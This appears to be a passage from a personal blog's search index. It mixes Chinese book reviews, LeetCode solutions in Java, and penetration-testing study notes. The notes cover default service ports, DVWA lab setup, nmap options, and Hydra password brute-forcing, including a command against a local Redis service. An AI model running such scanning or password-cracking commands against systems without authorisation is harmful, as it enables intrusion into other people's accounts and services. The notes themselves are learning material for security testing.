来检测服务的开放端口来猜测服务的类型,从而展开对应的安全测试、攻击.下面列举了部分应用的默认端口号. 常见网络协议端口 端口 服务类型 20,21 FTP 22 SSH 23 Telnet 53 DNS 67/68 DHCP 443 https 1080 SOCKS 代理协议服务器常用端口 69 TFTP 邮件服务 端口 服务类型 25 SMTP 110 POP3 143 IMAP WEB 服务器类 端口 服务类型 80 Apache,Nginx 8080 Tomcat,Jboss,jetty,glassfish 等 servlet 容器的默认端口 4848 glassfish 控制台端口 7001/7002 weblogic 控制台 9090 webshpere 控制台 9090 webshpere 控制台 1352 Lotus domino 邮件服务 10000 webmin-web 控制台 数据库类 端口 服务类型 3306 MySQL 1521 Oracle 5432 postgreSQL 2100 Oracle XDB FTP 服务 1433 MSSQL SERVER 数据库 server 1434 MSSQL SERVER 数据库 monitor 5000 Sysbase DB2 6379 redis 11211 memcache 27017 mongod 和 mongos 实例的默认端口。你可以通过 port 或 —port 改变该端口。 27018 mongodb 设置 —shardsvr 运行变量或在配置文件里设置 clusterRole 为 shardsvr 时的默认端口。 27019 mongodb 设置 —configsvr 运行变量或在配置文件中将 clusterRole 设置为 configsvr 时的默认端口。 28017 mongodb 系统状态网页的默认端口。系统状态网络页面永远可以在比 port 大 1000 的端口反问。 其他服务 端口 服务类型 2181 zookeeper 5671 rabbitMQ 3128 squid 代理服务器 8069 zabbix 7077 spark 9200/9300 Elasticearch 3690 SVN 512/513/514 Linux Rexec 服务 873 Rsync 服务 50000 SAP management console 检测服务目录渗透测试中，扫描服务器的敏感目录或文件是主要的环节,从中可以获取文件的后台控制页面、敏感秘钥文件目录、甚至获取到网站的源代码.比较常用的工 具有御剑后台扫描,DirBuster,wwwscan 等工具来扫描服务器的目录信息。 wwwscan 扫描的结果,发现的目录会直接显示出来. 子域名检测到这几个网站上即可在线检测域名对应的子域名信息 https://phpinfo.me/domain/站长工具 &gt; 子域名查询 参考资料 红帽企业 Linux 中的服务、守护进程、和程序所使用的最常见的通信端口 上海交通大学网络信息中心网络紧急响应组 渗透测试研究中心 google hacker 语法手册","updated":"2020-07-19T00:23:27.930Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"鱼羊野史","date":"2019-07-15T12:15:00.000Z","path":"2019/07/15/读书笔记/鱼羊野史/","text":"内容简介《鱼羊野史(1-6 卷)(套装共 6 册)》是东方卫视脱口秀节目《晓松说——历史上的今天》未删节版完整收录的超级读本。 《鱼羊野史》讲述每一天在历史上发生的大事件或有趣的事，以高晓松的角度来重新解读历史事件，风格轻松幽默，与严肃的讲历史的不同，有很多高晓松个人见解和趣闻，重温故国、故城、故人芳华刹那。 作者简介高晓松，中国著名音乐制作人、电影导演、词曲创作者、写字者，阿里音乐集团董事长。 代表作品： 音乐作品 《同桌的你》《恋恋风尘》《万物生》《彼得堡遗书》 《校园民谣》作品集、《青春无悔》作品集、《万物生长》作品集 电影作品 《那时花开》《我心飞翔》《大武生》《同桌的你》 文学作品 《写在墙上的脸》《如丧：我们终于老得可以谈谈未来》“晓说”系列 读后感读了第四卷,感觉高晓松挺渊博也挺八卦的,当趣闻看了…","updated":"2020-07-19T00:23:28.466Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"121. Best Time to Buy and Sell Stock","date":"2019-07-15T06:50:00.000Z","path":"2019/07/15/数据结构和算法/leetcode/Best Time to Buy and Sell Stock/","text":"Say you have an array for which the ith element is the price of a given stock on day i. If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit. Note that you cannot sell a stock before you buy one. Example 1: 1234Input: [7,1,5,3,6,4]Output: 5Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5. Not 7-1 = 6, as selling price needs to be larger than buying price. Example 2: 123Input: [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit = 0. 题意给定一个股票价格的数组,索引表示买入股票的天数.求出某一天卖出股票使得股票收益最大,求出这个最大收益值. 实现 java 暴力枚举求解,时间复杂度为 O(n^2) 1234567891011121314public static int maxProfit(int[] prices) &#123; int len = prices.length; int result = 0; for(int i = 0; i &lt; len; i++) &#123; int a = prices[i]; for(int j = i + 1; j &lt; len; j++) &#123; int b = prices[j]; if(b &gt; a &amp;&amp; ( b - a ) &gt; result) &#123; result = b - a; &#125; &#125; &#125; return result; &#125; java 动态规划 12345678public static int maxProfitDp(int[] prices) &#123; int maxCur = 0, maxSoFar = 0; for(int i = 1; i &lt; prices.length; i++) &#123; maxCur = Math.max(0, maxCur += prices[i] - prices[i - 1]); maxSoFar = Math.max(maxCur, maxSoFar); &#125; return maxSoFar; &#125; 动态规划 1234567891011public int maxProfit(int[] prices) &#123; int min = Integer.MAX_VALUE, max = -1, n = prices.length; if (n == 0) return 0; for(int i=0;i&lt;n;i++)&#123; if(min&gt;prices[i])&#123; min = prices[i]; &#125; max = Math.max(max,prices[i]-min); &#125; return max; &#125; 参考 best-time-to-buy-and-sell-stock","updated":"2020-07-19T00:23:28.022Z","tags":[{"name":"DP","slug":"DP","permalink":"http://xwolf191.github.io/tags/DP/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"kail linux 网络配置","date":"2019-07-13T23:40:00.000Z","path":"2019/07/14/security/kail网络配置/","text":"执行msfupdate更新metasploit时失败,网络配置错误,下载失败. 按照如下配置网卡、DNS后，重启网络配置. ping一下目标ip,发现网络已经ok。继续执行操作即可.另外: kail的默认密码为toor.","updated":"2020-07-19T00:23:27.913Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"渗透测试环境DVWA环境搭建","date":"2019-07-13T10:53:00.000Z","path":"2019/07/13/security/渗透测试环境DVWA环境搭建/","text":"DVWA主要是用于学习Web的常见攻击，比如SQL注入、XSS等的一个渗透测试系统. 前期准备由于DVWA是用php语言写的安全测试平台，所以我们先要创建一个php开发集成环境。 XAMPP安装 下载到 DVWA下载应用包,是一个zip。解压到xampp的htdocs目录并重命名为dvwa。 启动xampp 配置浏览器输入localhost://82/dvma即可进入dvwa配置界面 配置数据库点击创建即可,下面会提示错误信息.数据库未连接等.修改配置 成功后进入登录页面输入密码 admin/password进入主界面. 至此DVWA的环境已经搭建ok. 遇到的问题DVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment.将config.inc.php.dist 重命名为config.inc.php即可. Could not connect to the MySQL service.Please check the config file.修改config.inc.php中对应的数据库用户名、密码等信息。","updated":"2020-07-19T00:23:27.938Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"天才在左 疯子在右","date":"2019-07-09T07:15:00.000Z","path":"2019/07/09/读书笔记/天才在左疯子在右/","text":"内容简介本书以访谈录的形式记载了生活在另一个角落的人群（精神病患者、心理障碍者等边缘人）深刻、视角独特的所思所想，让人们可以了解到疯子抑或天才真正的内心世界。此书是国内第一本具有人文情怀的精神病患谈访录。内容涉及生理学、心理学、佛学、宗教、量子物理、符号学以及玛雅文明和预言等众多领域。 作者简介高铭，男，汉族。生于上世纪 70 年代的北京。目前任职于某公司项目总监。 自认为死心眼一根筋，对于探索未知事物总是有无尽渴望。从学龄前就已经有了至今仍然挂在嘴边的口头禅：“为什么？”成年后曾一度沉迷于宗教、哲学、量子物理、非线性动力学、心理学、生物学、天体物理等学科。21 世纪以来又开始对精神病患、心理障碍者、边缘人的内心世界产生了强烈好奇。 2004—2008 年间，通过各种渠道，利用所有的闲暇时间，探访精神病院、公安部等机构，对“非正常人群”进行近距离访谈，并加工整理出了这本书的内容。 “我从未想到居然有这么多人鼓励并欣赏这些内容，长久以来，我一直以为自己是个疯子。但是，我很欣慰。” 读后感开始的几个问题感觉还是很不错的,打破惯性思维、勇于拆掉思维的墙. 关于女人的 X 染色体基因数是一千多,而男人的 Y 染色体是几十个,得出女人最终要统治地球的结论果然很让人很精神,女人的世界男人理解不了,这些也是以后的事了,当下并没有这些的研究来论证这个问题.","updated":"2020-07-19T00:23:28.440Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"24. Swap Nodes in Pairs","date":"2019-07-09T05:00:00.000Z","path":"2019/07/09/数据结构和算法/leetcode/Swap Nodes in Pairs/","text":"Given a linked list, swap every two adjacent nodes and return its head. You may not modify the values in the list’s nodes, only nodes itself may be changed. Example: 1Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3. 题意交换链表相邻两个节点的值. 实现 java 递归实现 12345678910public ListNode swap(ListNode head) &#123; if(( head == null ) || ( head.next == null )) &#123; return head; &#125; ListNode n = head.next; System.out.println(n); head.next = swapPairs(head.next.next); n.next = head; return n; &#125; 参考 swap-nodes-in-pairs","updated":"2020-07-19T00:23:28.040Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"递归","slug":"递归","permalink":"http://xwolf191.github.io/tags/递归/"}]},{"title":"118. Pascal's Triangle","date":"2019-07-08T03:00:00.000Z","path":"2019/07/08/数据结构和算法/leetcode/Pascal's Triangle/","text":"Given a non-negative integer numRows, generate the first numRows of Pascal’s triangle. In Pascal’s triangle, each number is the sum of the two numbers directly above it. Example: Input: 5 Output: 1234567[ [1], [1,1], [1,2,1], [1,3,3,1], [1,4,6,4,1]] 题意实现帕斯卡三角. 实现 java 递归实现。 123456789101112131415161718192021222324252627public List&lt;List&lt;Integer&gt;&gt; generate(int numRows) &#123; List&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;(); for(int i = 0; i &lt; numRows; i++) &#123; result = result(result); &#125; return result; &#125; public List&lt;List&lt;Integer&gt;&gt; result(List&lt;List&lt;Integer&gt;&gt; result) &#123; int size = result.size(); if(size == 0) &#123; List&lt;Integer&gt; ele = new ArrayList&lt;&gt;(); ele.add(1); result.add(ele); return result; &#125; List&lt;Integer&gt; lastEle = result.get(size - 1); int lastSize = lastEle.size(); List&lt;Integer&gt; e = new ArrayList&lt;&gt;(); e.add(1); for(int i = 0; i &lt; lastSize - 1; i++) &#123; e.add(lastEle.get(i) + lastEle.get(i + 1)); &#125; e.add(1); result.add(e); return result; &#125; 参考 118. Pascal’s Triangle","updated":"2020-07-19T00:23:28.034Z","tags":[{"name":"DP","slug":"DP","permalink":"http://xwolf191.github.io/tags/DP/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"递归","slug":"递归","permalink":"http://xwolf191.github.io/tags/递归/"}]},{"title":"零售心理战","date":"2019-07-04T10:10:00.000Z","path":"2019/07/04/读书笔记/零售心理战/","text":"内容简介全球最大便利店连锁公司 7-Eleven 的创始人——铃木敏文，结合 40 多年的零售经验，为您讲述洞察顾客心理的成功秘诀： 一、不要为顾客着想，而是要站在顾客的立场上思考 虽然这两个概念看似大同小异，但“为顾客着想”终究是站在卖方的立场，脱离了普通消费者的生活；而“站在顾客立场”思考则跳出了“业内人士”的思维定势和经验框架，更易找到消费者的真实需求。 二、购买需要理由 顾客并非不愿意购买，他们只是在为自己的购买行为寻找一个合理理由。当顾客从一个产品中看到了能满足自己需求的购买理由时，就必然会购买。 三、持续给予顾客“附加值” 顾客总是在追求有附加价值的产品。因此作为卖方，我们必须持续给予顾客附加值，以满足顾客不断改变的需求。当卖方放弃思考与努力，不再拓展产品或服务价值的广度时，顾客的忠诚度也会随之一落千丈。 四、任何人离开工作，都是一名普通的消费者 在工作时，人们往往会不自觉地从公司或某些冠冕堂皇的角度看待问题。但其实，任何人离开工作，都是一名普通的消费者。只要回归平常的生活，就不难领会消费者的内心。答案在顾客内心的同时，也藏在“自己”的心中。 通过引述日本各行业一线成功人士——包括 AKB48 制作人秋元康、优衣库品牌设计师佐藤可士和、JR 东日本 Ecute 创始人镰田由美子等人的经营理念及案例，铃木敏文将为您献上一系列最经典、最全面、最实用、最通俗易懂的零售心理战策略。 作者简介铃木敏文，世界级企业家，日本 7-ELEVEN 创办人。他被日本媒体称为继松下幸之助之后的“日本新经营之神”，美国《哈佛商业评论》评价其为“融合东西方管理精神的最佳典范”。他领导的日本最大的零售集团 SEVEN&amp;I 控股公司为全球第四大、亚洲最大的零售王国，营业额约等同日本 GDP 的 1.25％，富可敌国。 读后感消费心理确认很重要,抓住消费者的心理可以在一定程度上提高营业额.随着消费水平的提高,一味的打价格战反而会适得其反,低价策略并一定适合所有消费者。消费者失去东西要比得到东西更加刻骨铭心。合理的定价策略也对营业额有一定的促进作用…一句话,满足消费者的需求才是生存发展的基础。","updated":"2020-07-19T00:23:28.459Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"nmap使用","date":"2019-06-25T11:20:00.000Z","path":"2019/06/25/security/nmap使用/","text":"nmap 是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用 nmap 来探测工作环境中未经批准使用的服务器，但是黑客会利用 nmap 来搜集目标电脑的网络设定，从而计划攻击的方法。Nmap 常被跟评估系统漏洞软件 Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。 下载nmap官网上下载 Windows、Linux、MacOS 对应系统的版本安装即可. 基础语法在终端中键入 nmap 即可看到基本的命令信息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116C:\\Users\\Administrator&gt;nmapNmap 7.70 ( https://nmap.org )Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL &lt;inputfilename&gt;: Input from list of hosts/networks -iR &lt;num hosts&gt;: Choose random targets --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks --excludefile &lt;exclude_file&gt;: Exclude list from fileHOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each hostSCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags &lt;flags&gt;: Customize TCP scan flags -sI &lt;zombie host[:probeport]&gt;: Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b &lt;FTP relay host&gt;: FTP bounce scanPORT SPECIFICATION AND SCAN ORDER: -p &lt;port ranges&gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging)SCRIPT SCAN: -sC: equivalent to --script=default --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts --script-args-file=filename: provide NSE script args in a file --script-trace: Show all data sent and received --script-updatedb: Update the script database. --script-help=&lt;Lua scripts&gt;: Show help about scripts. &lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories.OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressivelyTIMING AND PERFORMANCE: Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T&lt;0-5&gt;: Set timing template (higher is faster) --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies probe round trip time. --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions. --host-timeout &lt;time&gt;: Give up on target after this long --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per secondFIREWALL/IDS EVASION AND SPOOFING: -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU) -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys -S &lt;IP_Address&gt;: Spoof source address -e &lt;iface&gt;: Use specified interface -g/--source-port &lt;portnum&gt;: Use given port number --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies --data &lt;hex string&gt;: Append a custom payload to sent packets --data-string &lt;string&gt;: Append a custom ASCII string to sent packets --data-length &lt;num&gt;: Append random data to sent packets --ip-options &lt;options&gt;: Send packets with specified ip options --ttl &lt;val&gt;: Set IP time-to-live field --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksumOUTPUT: -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename. -oA &lt;basename&gt;: Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --append-output: Append to rather than clobber specified output files --resume &lt;filename&gt;: Resume an aborted scan --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML outputMISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir &lt;dirname&gt;: Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page.EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES 明确目标检测操作系统检测-O 服务/版本检测-sV: 探测开放端口的服务或者版本信息 —version-intensity : Set from 0 (light) to 9 (try all probes)—version-light: Limit to most likely probes (intensity 2)—version-all: Try every single probe (intensity 9)—version-trace: Show detailed version scan activity (for debugging) 输出-oN/-oX/-oS/-oG : Output scan in normal, XML, s|","updated":"2020-07-19T00:23:27.917Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"零售的哲学","date":"2019-06-19T01:10:00.000Z","path":"2019/06/19/读书笔记/零售的哲学/","text":"内容简介全球最大的便利店连锁公司创始人——铃木敏文，结合 40 多年零售经验，为你讲述击中消费心理的零售哲学。铃木敏文的很多创新，现在已经成为商界常识，本书把那些不可思议的零售创新娓娓道来。关于零售的一切：选址、订货、销售、物流、管理……他一次又一次地在一片反对声中创造出零售界的新纪录。 翻开本书，看铃木敏文如何领导 7-11 冲破层层阻碍，成为世界第一的零售哲学。 作者简介铃木敏文世界级企业家，日本 7-ELEVEN 创办人。他被日本媒体称为继松下幸之助之后的“日本新经营之神”，美国《哈佛商业评论》评价其为“融合东西方管理精神的最佳典范”。他领导的日本最大的零售集团 SEVEN&amp;I 控股公司为全球第四大、亚洲最大的零售王国，营业额约等同日本 GDP 的 1.25％，富可敌国。他曾三次领军企业变革，没有一次失败；而他所建立的“单品管理”概念，甚至让英语世界创造了一个新的名词“Tanpin Kanri”（“单品管理”日文发音）。 读后感刚开始读就被作者敏锐、独到的眼光折服.做事脚踏实地的态度在当今（2019 年）这个浮躁的社会大环境中如此难得。不随波逐流、坚持自我、力排众议这些性格特点也为前路的发展有一些利好的影响。看完以后更加佩服日本人对工作、生活认真负责的态度,实干家。而当下中国浮躁的环境下,人人都匆忙的追名逐利,一切向”钱”看,放弃企业、自己的责任…","updated":"2020-07-19T00:23:28.461Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"hydra试用","date":"2019-06-13T22:40:00.000Z","path":"2019/06/14/security/hydra试用/","text":"Hydra 对应的英文意思是九头蛇，它是一款爆破神器，可以对多种服务的账号和密码进行爆破，包括 Web 登录、数据库、SSH、FTP 等服务，支持 Linux、Windows、Mac 平台安装，其中 Kali Linux 中自带 Hydra。 安装kail linux 中已经集成了 hydra,这次在 windows 下安装.先到 github 下载window 版本 hydra.解压在命令行中输入 hydra,如果成功就会看到如下界面: 1234567891011121314151617181920212223242526272829303132C:\\tools\\hacketools\\thc-hydra-windows&gt;hydraHydra v8.7-dev (c) 2018 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-oFILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]Options: -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -C FILE colon separated &quot;login:pass&quot; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, &apos;:&apos; to specify port -t TASKS run TASKS number of connects in parallel per target (default: 16) -U service module usage details -h more command line options (COMPLETE HELP) server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help)Supported services: adam6500 asterisk cisco cisco-enable cvs ftp ftps http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s]irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmppHydra is a tool to guess/crack valid login/password pairs. Licensed under AGPLv3.0. The newest version is always available at http://www.thc.org/thc-hydraDon&apos;t use in military or secret service organizations, or for illegal purposes.Example: hydra -l user -P passlist.txt ftp://192.168.0.1 键入-h 查看更多命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263C:\\tools\\hacketools\\thc-hydra-windows&gt;hydra -hHydra v8.7-dev (c) 2018 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-oFILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]Options: -R restore a previous aborted/crashed session -I ignore an existing restore file (don&apos;t wait 10 seconds) -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type &quot;-x -h&quot; to get help -y disable use of symbols in bruteforce, see above -e nsr try &quot;n&quot; null password, &quot;s&quot; login as pass and/or &quot;r&quot; reversed login -u loop around users, not passwords (effective! implied with -x) -C FILE colon separated &quot;login:pass&quot; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, &apos;:&apos; to specify port -o FILE write found login/password pairs to FILE instead of stdout -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1 -f / -F exit when a login/pass pair is found (-M: -f per host, -F global) -t TASKS run TASKS number of connects in parallel per target (default: 16) -T TASKS run TASKS connects in parallel overall (for -M, default: 64) -w / -W TIME wait time for a response (32) / between connects per thread (0) -c TIME wait time per login attempt over all threads (enforces -t 1) -4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M) -v / -V / -d verbose mode / show login+pass for each attempt / debug mode -O use old SSL v2 and v3 -q do not print messages about connection errors -U service module usage details -h more command line options (COMPLETE HELP) server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help)Supported services: adam6500 asterisk cisco cisco-enable cvs ftp ftps http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s]irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmppHydra is a tool to guess/crack valid login/password pairs. Licensed under AGPLv3.0. The newest version is always available at http://www.thc.org/thc-hydraDon&apos;t use in military or secret service organizations, or for illegal purposes.These services were not compiled in: afp firebird ncp oracle radmin2 sapr3 svn.Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://) % export HYDRA_PROXY=connect_and_socks_proxylist.txt (up to 64 entries) % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080 % export HYDRA_PROXY_HTTP=proxylist.txt (up to 64 entries)Examples: hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh 语法hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]][-e nsr] [-oFILE][-t tasks] [-M FILE [-T TASKS]][-w time] [-W TIME][-f] [-s PORT][-x min :max:charset] [-c TIME][-isouvvd46] [service://server[:PORT][/opt]] 常用命令 -R从上一次的进度接着继续破解 -l 指定用户名登录 -L 指定用户名的文件(字典) -p 指定密码登录 -P 指定密码文件(字典) -C 指定用户名:密码的字典文件 -M 指定攻击的服务列表 -s 指定服务端口 -S 使用 SSL 连接 -o 保存攻击结果到文件 -t 设置攻击线程数 -w 设置连接超时时间 -e 可选选项，n：空密码试探, s：使用指定用户和密码试探, r: 反向登录 -v/-V/-d 显示破解用户名:密码对，-d debug 模式。 -q 不打印连接失败的信息 -4/-6 用 IP v4 或者 v6. 试用破解 mysql 可以加上-o 保存结果到文件. 破解 redis没有用户名,直接使用密码字典即可. 1hydra -P ../password.txt -e nsr -V -o redis.txt localhost redis 基本模式就是这个样子,其他各种协议在具体场景中可以再具体使用. 参考资料 常用密码词典 密码字典","updated":"2020-07-19T00:23:27.909Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"CountDownLatch模拟并发测试","date":"2019-06-13T07:30:00.000Z","path":"2019/06/13/java/CountDownLatch模拟并发测试/","text":"CountDownLatch 是一个同步工具类，它允许一个或多个线程一直等待，直到其他线程的操作执行完后再执行。","updated":"2020-07-19T00:23:27.850Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"402. Remove K Digits","date":"2019-06-11T10:45:00.000Z","path":"2019/06/11/数据结构和算法/leetcode/Remove K Digits/","text":"Given a non-negative integer num represented as a string, remove k digits from the number so that the new number is the smallest possible. Note: The length of num is less than 10002 and will be ≥ k. The given num does not contain any leading zero. Example 1: 123Input: num = &quot;1432219&quot;, k = 3Output: &quot;1219&quot;Explanation: Remove the three digits 4, 3, and 2 to form the new number 1219 which is the smallest. Example 2: 123Input: num = &quot;10200&quot;, k = 1Output: &quot;200&quot;Explanation: Remove the leading 1 and the number is 200. Note that the output must not contain leading zeroes. Example 3: 123Input: num = &quot;10&quot;, k = 2Output: &quot;0&quot;Explanation: Remove all the digits from the number and it is left with nothing which is 0. 题意删除字符串数字中指定的 k 个数字,使得剩下的数字尽可能小. 实现 java 123456789101112131415161718192021222324public String removeKdigits(String num, int k) &#123; int digits = num.length() - k; char[] stk = new char[num.length()]; int top = 0; // k keeps track of how many characters we can remove // if the previous character in stk is larger than the current one // then removing it will get a smaller number // but we can only do so when k is larger than 0 for(int i = 0; i &lt; num.length(); ++i) &#123; char c = num.charAt(i); while (top &gt; 0 &amp;&amp; stk[top - 1] &gt; c &amp;&amp; k &gt; 0) &#123; top -= 1; k -= 1; &#125; stk[top++] = c; System.out.println(stk); 